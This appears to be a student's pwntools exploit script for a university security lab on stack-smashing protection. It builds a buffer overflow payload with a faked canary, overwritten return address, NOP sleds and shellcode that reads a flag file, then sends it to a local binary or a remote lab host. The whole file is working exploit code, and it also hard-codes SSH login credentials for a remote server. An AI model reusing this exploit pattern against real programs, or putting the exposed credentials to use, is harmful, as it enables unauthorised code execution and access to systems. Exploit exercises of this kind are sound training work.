#!/usr/bin/env python2

from pwn import *

def writeToFile(payload):
    # Write shellcode to a binary
    f = open('/tmp/shellcode', 'w')
    f.write(payload)
    f.close()

def createPayload(padding, exeAddr, shellcode):
    nop_offset = 10
    start_addr = exeAddr + (nop_offset/2)
    nop_sled = "\x90" * nop_offset
    canary = 0xdeadbeef

    # start constructing payload
    payload  = 'AAAABBBBCCCCDDDD'
    payload += p32(canary)
    payload += cyclic(cyclic_find(padding))
    #payload += cyclic(100)
    payload += p32(start_addr)
    payload += nop_sled
    payload += asm(shellcode)
    payload += nop_sled

    # Address sled
    for i in range (0, 200):
        payload += p32(start_addr)

    return payload

# Setup some init args
exe = "target-ssp"
#exe = "/crackme0x00-ssp-exec"
mydir = "tut04-ssp"
sshPath = "/home/lab04/"
vagrantPath = "/home/vagrant/cs6265/lab04/"

context.terminal = ['tmux', 'splitw', '-v']
context.update(arch='i386', os='linux')

def runExploit(payload, sshEnabled=False, debug=False):
    if sshEnabled:
        s = ssh("lab04", "52.201.10.159", password="72cb6693")
        #p = s.process([exe, payload], cwd=sshPath+mydir)
        #p = s.process(exe, cwd=sshPath+mydir)
        p = s.process('/tmp/jakeholl/invoke.sh ./'+exe, cwd=sshPath+mydir)
    else:
        newExe = vagrantPath+mydir+'/'+exe

        # IF we take param before
        #p = process([vagrantPath+mydir+exe, payload], cwd=vagrantPath+mydir)

        # If we take param after exe
        p = process(newExe, cwd=vagrantPath+mydir)

       # p = gdb.debug(newExe, ''' 
       # b main
       # start
       # c
       # b *0x56555705
       # c''')

    p.sendline(payload)
    p.interactive()

#######################################################################################

# Address that we find the padding to be aa
padding = 0x61616164

# Address to use
# Got this address by forcing a segfault, using the telescope command to
# examine the stack, then examining the stack with x/20wx
eip = (0xffffd41c+4)
serv = 0xffffdd6c+4
#server_start_gdb = (0xffffd41c+4)

shellcode = shellcraft.cat("/tmp/flag")
payload = createPayload(padding, eip, shellcode)
writeToFile(payload)

runExploit(payload)

